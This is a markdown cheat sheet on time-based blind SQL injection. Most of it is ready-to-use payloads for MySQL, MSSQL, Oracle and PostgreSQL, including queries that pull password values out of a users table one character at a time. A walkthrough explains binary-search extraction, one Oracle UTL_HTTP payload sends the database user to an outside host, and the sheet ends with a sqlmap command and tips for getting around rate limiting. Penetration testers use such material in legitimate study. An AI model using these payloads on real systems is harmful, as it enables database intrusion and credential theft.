# Time-based Blind SQL Injection

## Overview

Time-based blind SQLi infers data by measuring response delays. Used when:
- No error messages
- No visible response difference for true/false
- Only timing differences are observable

## Detection

### Basic Time Delay Test

| DBMS | Payload |
|------|---------|
| MySQL | `' AND SLEEP(5)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` |
| Oracle | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--` |
| PostgreSQL | `'; SELECT pg_sleep(5)--` |

## MySQL Time-based

### SLEEP Function

```sql
-- Basic delay
' AND SLEEP(5)--

-- Conditional delay
' AND IF(1=1,SLEEP(5),0)--
' AND IF(1=2,SLEEP(5),0)--   -- No delay

-- Extract data
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(5),0)--
```

### BENCHMARK Alternative

```sql
-- Heavy computation delay
' AND BENCHMARK(10000000,SHA1('test'))--

-- Conditional
' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)--
```

### Data Extraction

```sql
-- Database name length
' AND IF(LENGTH(database())=5,SLEEP(5),0)--

-- Character extraction
' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)--  -- Binary search

-- Table name
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>96,SLEEP(5),0)--

-- Column data
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96,SLEEP(5),0)--
```

## MSSQL Time-based

### WAITFOR DELAY

```sql
-- Basic delay
'; WAITFOR DELAY '0:0:5'--
'; IF 1=1 WAITFOR DELAY '0:0:5'--

-- Conditional (stacked query required)
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (1=2) WAITFOR DELAY '0:0:5'--  -- No delay
```

### Data Extraction

```sql
-- Database name length
'; IF (LEN(DB_NAME())=5) WAITFOR DELAY '0:0:5'--

-- Character extraction  
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>96) WAITFOR DELAY '0:0:5'--

-- Extract from table
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96) WAITFOR DELAY '0:0:5'--

-- Count check
'; IF ((SELECT COUNT(*) FROM users)>0) WAITFOR DELAY '0:0:5'--
```

### Without Stacked Queries

```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)--
```

## Oracle Time-based

### DBMS_PIPE.RECEIVE_MESSAGE

Requires execution privileges:

```sql
-- Basic delay (10 seconds)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--

-- NOTE: This function may require privileges
```

### Heavy Query Alternative

When DBMS_PIPE not available, use heavy computational queries:

```sql
-- Heavy query (adjust count as needed)
' AND (SELECT COUNT(*) FROM all_users a, all_users b, all_users c, all_users d)>0--
```

### CASE-based Delay

```sql
' AND CASE WHEN (1=1) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',10) ELSE NULL END IS NOT NULL--

-- Data extraction
' AND CASE WHEN (ASCII(SUBSTR((SELECT user FROM dual),1,1))>96) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END IS NOT NULL--
```

### UTL_HTTP Alternative

```sql
' AND UTL_HTTP.REQUEST('http://10.0.0.1/'||(SELECT user FROM dual)) IS NOT NULL--
```

## PostgreSQL Time-based

### pg_sleep Function

```sql
-- Basic delay
'; SELECT pg_sleep(5)--

-- Conditional delay
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--  -- No delay
```

### Data Extraction

```sql
-- Database name length
' AND (SELECT CASE WHEN (LENGTH(current_database())=5) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Character extraction
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Table data
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### GENERATE_SERIES Heavy Query

Alternative if pg_sleep blocked:

```sql
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))>0--
```

## Complete Workflow Example

### Step 1: Confirm Time-based Works

```sql
' AND SLEEP(5)--   -- 5 second delay = vulnerable
```

### Step 2: Get Length

```sql
' AND IF(LENGTH(database())=1,SLEEP(3),0)--
' AND IF(LENGTH(database())=2,SLEEP(3),0)--
...
' AND IF(LENGTH(database())=5,SLEEP(3),0)--  -- Delay! Length is 5
```

### Step 3: Extract Characters (Binary Search)

```sql
-- Char 1: Is it > 'm' (109)?
' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(3),0)--  -- No delay: < 109

-- Is it > 'd' (100)?
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(3),0)--  -- No delay: <= 100

-- Is it = 'd' (100)?
' AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(3),0)--  -- Delay! First char is 'd'
```

### Step 4: Repeat for All Characters

Continue for position 2, 3, 4, 5...

## Optimization Tips

| Technique | Description |
|-----------|-------------|
| Binary Search | Reduces 128 checks to ~7 per character |
| Parallel Requests | Test multiple characters simultaneously |
| Shorter Delays | Use 1-2 second delays for faster enumeration |
| Length First | Always determine length before extraction |

## Pitfalls

| Issue | Solution |
|-------|----------|
| Network latency | Use longer delays (3-5 sec) |
| Load balancer | Delays may vary per server |
| Async processing | Time-based may not work |
| Rate limiting | Add delays between requests |

## Automation

SQLMap command:
```bash
sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=5
```
